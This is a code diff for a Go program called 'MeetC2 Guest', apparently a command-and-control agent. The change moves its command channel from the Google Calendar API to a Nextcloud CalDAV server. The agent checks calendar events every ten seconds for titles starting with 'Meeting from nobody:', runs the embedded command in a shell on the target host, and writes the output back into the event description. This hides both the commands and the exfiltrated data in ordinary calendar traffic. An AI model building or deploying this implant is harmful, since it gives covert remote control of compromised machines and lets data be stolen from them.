@@ -6,6 +6,7 @@ import (
 	"encoding/base64"
 	"fmt"
 	"log"
+	"net/http"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -14,54 +15,44 @@ import (
 	"syscall"
 	"time"
 
-	"golang.org/x/oauth2/google"
-	"google.golang.org/api/calendar/v3"
-	"google.golang.org/api/option"
+	"github.com/emersion/go-webdav/caldav"
 )
-
-var (
-	embedCredentials string
-	embedCalendarID  string
-)
-
-//go:embed credentials.json
-var embeddedCredsFile []byte
 
 type Guest struct {
-	service       *calendar.Service
-	calendarID    string
+	service       *caldav.Client
+	calendarID    string // This will be the full path to the calendar
 	commandPrefix string
 	hostname      string
 }
 
+// basicAuthRoundTripper is a helper to inject Basic Auth headers into requests.
+type basicAuthRoundTripper struct {
+	username string
+	password string
+	rt       http.RoundTripper
+}
+
+func (bat *basicAuthRoundTripper) RoundTrip(req *http.Request) (*http.Response, error) {
+	req2 := req.Clone(req.Context())
+	auth := bat.username + ":" + bat.password
+	req2.Header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(auth)))
+	return bat.rt.RoundTrip(req2)
+}
+
 func main() {
 	log.SetFlags(log.Ltime)
-	
-	var credData []byte
-	var calendarID string
 
-	if len(embeddedCredsFile) > 0 && embedCalendarID != "" {
-		credData = embeddedCredsFile
-		calendarID = embedCalendarID
-	} else if embedCredentials != "" && embedCalendarID != "" {
-		// Try build-time embedded
-		decoded, err := base64.StdEncoding.DecodeString(embedCredentials)
-		if err != nil {
-			log.Fatal("Failed to decode embedded credentials")
-		}
-		credData = decoded
-		calendarID = embedCalendarID
-	} else {
-		log.Fatal("No embedded credentials found")
-	}
+	// The calendar ID is now the full path to the calendar on the server.
+	// Example: "calendars/your_username/personal/"
+	calendarID := "calendars/admin/personal/" // <-- IMPORTANT: Set your calendar path here
 
-	guest, err := NewGuest(credData, calendarID)
+	guest, err := NewGuest(calendarID)
 	if err != nil {
 		log.Fatalf("Failed to initialize: %v", err)
 	}
-	
+
 	log.Printf("MeetC2 Guest started on %s", guest.hostname)
-	log.Printf("Calendar ID: %s", guest.calendarID)
+	log.Printf("Calendar Path: %s", guest.calendarID)
 	log.Printf("Polling every 10 seconds...")
 
 	ticker := time.NewTicker(10 * time.Second)
@@ -82,24 +73,30 @@ func main() {
 	}
 }
 
-func NewGuest(credData []byte, calendarID string) (*Guest, error) {
-	ctx := context.Background()
+func NewGuest(calendarID string) (*Guest, error) {
+	// --- IMPORTANT: CONFIGURE YOUR NEXTCLOUD DETAILS HERE ---
+	backendURL := "http://127.0.0.1/remote.php/dav/" //  URL
+	username := "admin"                              // Your Nextcloud username
+	appPassword := "admin"                           // An App Password generated in Nextcloud settings
+	// ---------------------------------------------------------
 
-	config, err := google.JWTConfigFromJSON(credData, calendar.CalendarScope)
-	if err != nil {
-		return nil, err
+	// Create a custom http.Client with Basic Auth
+	basicAuthTransport := &basicAuthRoundTripper{
+		username: username,
+		password: appPassword,
+		rt:       http.DefaultTransport,
 	}
+	httpClient := &http.Client{Transport: basicAuthTransport}
 
-	client := config.Client(ctx)
-	service, err := calendar.NewService(ctx, option.WithHTTPClient(client))
+	client, err := caldav.NewClient(httpClient, backendURL)
 	if err != nil {
-		return nil, err
+		return nil, fmt.Errorf("failed to create CalDAV client: %v", err)
 	}
 
 	hostname, _ := os.Hostname()
 
 	return &Guest{
-		service:       service,
+		service:       client,
 		calendarID:    calendarID,
 		commandPrefix: "Meeting from nobody:",
 		hostname:      hostname,
@@ -108,68 +105,98 @@ func NewGuest(credData []byte, calendarID string) (*Guest, error) {
 
 func (g *Guest) CheckAndExecute() {
 	now := time.Now()
-	timeMin := now.Format(time.RFC3339)
-	timeMax := now.Add(24 * time.Hour).Format(time.RFC3339)
 
-	events, err := g.service.Events.List(g.calendarID).
-		ShowDeleted(false).
-		SingleEvents(true).
-		TimeMin(timeMin).
-		TimeMax(timeMax).
-		OrderBy("startTime").
-		Do()
+	timeMin := now
+	timeMax := now.Add(24 * time.Hour)
 
+	// Build a CalDAV query to find events in the next 24 hours.
+	query := &caldav.CalendarQuery{
+		CompFilter: caldav.CompFilter{
+			Name: "VCALENDAR",
+			Comps: []caldav.CompFilter{{
+				Name:  "VEVENT",
+				Start: timeMin, 
+				End:   timeMax}},
+		},
+	}
+
+	// Query the calendar. This returns events as raw iCalendar data strings.
+	events, err := g.service.QueryCalendar(context.Background(), g.calendarID, query)
 	if err != nil {
 		log.Printf("Error listing events: %v", err)
 		return
 	}
 
-	for _, event := range events.Items {
-		if !strings.HasPrefix(event.Summary, g.commandPrefix) {
+	for _, eventData := range events {
+		// Parse the raw iCalendar data string.
+		cal := eventData.Data
+		if cal == nil {
+			log.Printf("Failed to decode event: %v", err)
 			continue
 		}
 
-		// Check if already executed by this host
-		if strings.Contains(event.Description, fmt.Sprintf("[OUTPUT-%s]", g.hostname)) {
+		if len(cal.Children) == 0 {
+			continue
+		}
+		vevent := cal.Children[0]
+
+		// Extract properties from the parsed event.
+		summary, err := vevent.Props.Text("SUMMARY")
+		if err != nil {
+			log.Printf("Failed to get summary: %v", err)
+			continue
+		}
+		description, _ := vevent.Props.Text("DESCRIPTION")
+		uid, _ := vevent.Props.Text("UID")
+
+		if !strings.HasPrefix(summary, g.commandPrefix) {
 			continue
 		}
 
-		// Parse command for host targeting
-		cmd := strings.TrimPrefix(event.Summary, g.commandPrefix)
-		cmd = strings.TrimSpace(cmd)
-		
+		if strings.Contains(description, fmt.Sprintf("[OUTPUT-%s]", g.hostname)) {
+			continue
+		}
+
+		// Parse command from the event summary.
+		commandLine := strings.TrimSpace(strings.TrimPrefix(summary, g.commandPrefix))
 		targetHost := ""
-		actualCmd := cmd
-		
-		// Check for targeted command format: @hostname:command or @*:command
-		if strings.HasPrefix(cmd, "@") {
-			parts := strings.SplitN(cmd, ":", 2)
+		actualCmd := commandLine
+
+		if strings.HasPrefix(commandLine, "@") {
+			parts := strings.SplitN(commandLine, ":", 2)
 			if len(parts) == 2 {
 				targetHost = strings.TrimPrefix(parts[0], "@")
 				actualCmd = parts[1]
-				
-				// Skip if not targeted to this host
+
 				if targetHost != "" && targetHost != g.hostname && targetHost != "*" {
 					continue
 				}
 			}
 		}
+		cmdParts := strings.Fields(actualCmd)
+		command := ""
+		args := ""
+		if len(cmdParts) > 0 {
+			command = cmdParts[0]
+		}
+		if len(cmdParts) > 1 {
+			args = strings.Join(cmdParts[1:], " ")
+		}
 
-		output := g.ExecuteCommand(actualCmd, event.Description)
-		g.UpdateEventWithOutput(event.Id, output)
+		output := g.ExecuteCommand(command, args)
+		g.UpdateEventWithOutput(uid, output, eventData.Path)
 	}
 }
 
 func (g *Guest) ExecuteCommand(command, args string) string {
-	// Add host identifier to all outputs
 	hostInfo := fmt.Sprintf("[Host: %s]\n", g.hostname)
-	log.Printf("Executing command: %s", command)
-	
+	log.Printf("Executing command: %s %s", command, args)
+
 	switch command {
 	case "whoami":
 		user := os.Getenv("USER")
 		if user == "" {
-			user = os.Getenv("USERNAME") // Windows
+			user = os.Getenv("USERNAME")
 		}
 		if user == "" {
 			user = "unknown"
@@ -201,9 +228,9 @@ func (g *Guest) ExecuteCommand(command, args string) string {
 	default:
 		var cmd *exec.Cmd
 		if runtime.GOOS == "windows" {
-			cmd = exec.Command("cmd", "/c", command)
+			cmd = exec.Command("cmd", "/c", command+" "+args)
 		} else {
-			cmd = exec.Command("sh", "-c", command)
+			cmd = exec.Command("sh", "-c", command+" "+args)
 		}
 
 		output, err := cmd.CombinedOutput()
@@ -214,18 +241,30 @@ func (g *Guest) ExecuteCommand(command, args string) string {
 	}
 }
 
-func (g *Guest) UpdateEventWithOutput(eventID, output string) error {
-	event, err := g.service.Events.Get(g.calendarID, eventID).Do()
+func (g *Guest) UpdateEventWithOutput(eventUID, output, eventPath string) error {
+	// To update an event, we must fetch its current data, modify it, and PUT it back.
+	// We already have the path and can fetch the object directly.
+	obj, err := g.service.GetCalendarObject(context.Background(), eventPath)
 	if err != nil {
-		return err
+		return fmt.Errorf("failed to get event object for update: %v", err)
 	}
 
-	// Add host-specific output marker
-	event.Description = fmt.Sprintf("%s\n\n[OUTPUT-%s]\n%s\n[/OUTPUT-%s]",
-		event.Description, g.hostname, output, g.hostname)
-	event.ColorId = "11"
+	// Parse the iCalendar data.
+	cal := obj.Data
+	if cal == nil {
+		return fmt.Errorf("failed to decode event for update: %v", err)
+	}
 
-	_, err = g.service.Events.Update(g.calendarID, eventID, event).Do()
+	// Modify the description.
+	vevent := cal.Children[0]
+	description, _ := vevent.Props.Text("DESCRIPTION")
+	newDescription := fmt.Sprintf("%s\n\n[OUTPUT-%s]\n%s\n[/OUTPUT-%s]",
+		description, g.hostname, output, g.hostname)
+	vevent.Props.SetText("DESCRIPTION", newDescription)
+
+	// PUT the modified calendar object back to the server.
+	fmt.Println(output)
+	_, err = g.service.PutCalendarObject(context.Background(), eventPath, cal)
 	if err != nil {
 		log.Printf("Failed to update event: %v", err)
 	} else {
